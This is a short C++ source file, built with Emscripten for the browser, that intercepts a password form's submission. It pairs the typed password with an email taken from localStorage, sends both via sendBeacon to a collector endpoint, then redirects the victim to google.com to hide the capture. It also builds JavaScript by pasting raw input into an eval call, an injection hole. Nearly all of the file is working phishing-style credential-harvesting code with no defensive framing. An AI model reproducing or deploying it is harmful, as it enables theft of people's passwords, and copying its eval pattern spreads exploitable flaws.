#include <emscripten/emscripten.h>
#include <emscripten/val.h>
#include <emscripten/bind.h>
#include <string>

using namespace emscripten;

extern "C" {

EMSCRIPTEN_KEEPALIVE
void forward(const char* email, const char* password) {
  std::string jsCode =
    "(function(email, password) {"
    "  const data = { email: email, password: password };"
    "  navigator.sendBeacon('http://localhost:3000/api/fowarded', JSON.stringify(data));"
    "  window.location.href = 'https://www.google.com';"
    "})('" + std::string(email) + "','" + std::string(password) + "');";

  val::global("eval")(val(jsCode));
}

EMSCRIPTEN_KEEPALIVE
void setup() {
  val document = val::global("document");
  val form = document.call<val>("getElementById", std::string("password-form"));
  val handler = val::module_property("onSubmit");
  form.call<void>("addEventListener", std::string("submit"), handler);
}

}

EMSCRIPTEN_BINDINGS(my_module) {
  function("onSubmit", emscripten::optional_override([](val event) {
    event.call<void>("preventDefault");

    val document = val::global("document");
    val email = val::global("localStorage").call<val>("getItem", std::string("user_email"));
    if (email.isNull() || email.isUndefined()) {
      email = val("unknown@example.com");
    }

    val passwordField = document.call<val>("getElementById", std::string("password"));
    val password = passwordField["value"];

    std::string emailStr = email.as<std::string>();
    std::string pwStr = password.as<std::string>();

    forward(emailStr.c_str(), pwStr.c_str());
  }));
}
